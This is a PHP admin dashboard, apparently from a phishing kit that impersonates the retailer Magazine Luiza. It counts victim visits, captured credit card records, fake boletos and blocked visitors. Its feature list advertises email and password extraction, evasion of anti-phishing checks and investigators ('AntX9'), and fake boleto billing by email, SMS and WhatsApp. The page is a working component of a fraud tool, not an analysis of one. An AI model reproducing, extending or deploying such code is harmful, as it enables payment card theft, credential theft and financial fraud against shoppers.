<?php
include("cabecalho.php");
include('../conexao.php');
$queryvisitas = "select * from visitas";
$resultadovisitas = mysqli_query($conexao, $queryvisitas);
$querycc = "SELECT * FROM `informacoes` WHERE metodo = \"Cartão\"";
$resultadocc = mysqli_query($conexao, $querycc);
$queryleto = "SELECT * FROM `informacoes` WHERE metodo = \"Boleto\"";
$resultadoleto = mysqli_query($conexao, $queryleto);
$numerovisitas = mysqli_num_rows($resultadovisitas);
$numerocc = mysqli_num_rows($resultadocc);
$numeroleto = mysqli_num_rows($resultadoleto);
$queryx9 = "SELECT * FROM `bloqueados`";
$resultadox9 = mysqli_query($conexao, $queryx9);
$numerox9 = mysqli_num_rows($resultadox9);
$queryletousado = "SELECT * FROM `boletos`";
$resultadousado = mysqli_query($conexao, $queryletousado);
$boletosusados = mysqli_num_rows($resultadousado);
?>
<div class="container-fluid">
    <div class="row">
        <div class="col-md-3">
            <div class="card p-4">
                <div class="card-body d-flex justify-content-between align-items-center">
                    <div>
                        <span class="h4 d-block font-weight-normal mb-2"><?=$numerovisitas?></span>
                        <span class="font-weight-light">Visitas</span>
                    </div>

                    <div class="h2 text-muted">
                        <i class="icon icon-people"></i>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-md-3">
            <div class="card p-4">
                <div class="card-body d-flex justify-content-between align-items-center">
                    <div>
                        <span class="h4 d-block font-weight-normal mb-2"><?=$numerocc?></span>
                        <span class="font-weight-light">Cartões</span>
                    </div>

                    <div class="h2 text-muted">
                        <i class="icon icon-credit-card"></i>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-md-3">
            <div class="card p-4">
                <div class="card-body d-flex justify-content-between align-items-center">
                    <div>
                        <span class="h4 d-block font-weight-normal mb-2"><?=$numeroleto?> <small style="font-size: 12px">de <?=$boletosusados?></small></span>
                        <span class="font-weight-light">Boletos</span>
                    </div>

                    <div class="h2 text-muted">
                        <i class="icon icon-doc"></i>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-md-3">
            <div class="card p-4">
                <div class="card-body d-flex justify-content-between align-items-center">
                    <div>
                        <span class="h4 d-block font-weight-normal mb-2"><?=$numerox9?></span>
                        <span class="font-weight-light">Bloqueados</span>
                    </div>

                    <div class="h2 text-muted">
                        <i class="icon icon-user-unfollow"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row ">
        <div class="col-md-12">
            <div class="card">
                <div class="card-header">
                    Magazine Luiza 1.7 - Sean Mack
                </div>

                <div class="card-body">
                    <img src="http://2.bp.blogspot.com/-5Ak15soApbI/UMDkdfils9I/AAAAAAAAHI0/OIk-tayYUBo/s1600/Render+Natal+-+Premium+Design+3D+(10).png" width="400px" height="400px" style="float: right">
                    MagazineLuiza - Orgulhosamente Desenvolvido Por Sean Mack <i class="icon-heart"></i>
                    <hr>
                    <b>Funções:</b> <br>
                    1. Funções Basicas de Boleto <br>
                    2. Otimizada Para Mobile <br>
                    3. Mascaras De Formulario em JQuery<br>
                    4. Extrator De Emails e Emails|Senha<br>
                    5. Função ANT X9 Implementada<br>
                    6. Possivel Alterar Dias De Vencimento Do Boleto<br>
					7. Cobrança de boleto por email!<br>
                    8. Cobrança de boleto por SMS!<br>
                    9. Cobrança de boleto por WPP!<br>
                    10. Cobrança de segunda via EMAIL!<br>
                    11. Antpgishing e AntX9 Optimizado!<br>
                    12. Correção de Bugs<br>
                    13. Codigo De Barra Boleto Funcional!<Br>
                    14. API MercadoPago.<br>
                    15. Correção De Bugs.<br>
                    16. Indexação De Pastas Vazias.

                </div>
            </div>
        </div>
    </div>
</div>
<?php
include("rodape.php");
?>
